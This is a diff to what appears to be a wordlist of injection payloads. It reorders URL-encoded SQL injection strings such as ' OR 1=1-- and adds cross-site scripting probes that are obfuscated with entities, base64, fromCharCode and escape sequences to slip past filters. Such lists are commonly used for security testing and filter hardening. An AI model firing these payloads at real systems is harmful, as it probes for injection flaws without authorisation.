@@ -1,5 +1,14 @@
-%27 OR %271%27=%271
-%27%20OR%20%271%27%3D%271
-' OR '1'%3D'1
-%27 OR 1=1--
 0x27 OR 1=1--
+%27%20OR%20%271%27%3D%271
+%27 OR 1=1--
+%27 OR %271%27=%271
+%3cscript%3ealert(1)%3c/script%3e
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
+' OR '1'%3D'1
+<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
+<svg><script>alert&#40;1&#41;</script>
+\u003cscript\u003ealert(1)\u003c/script\u003e
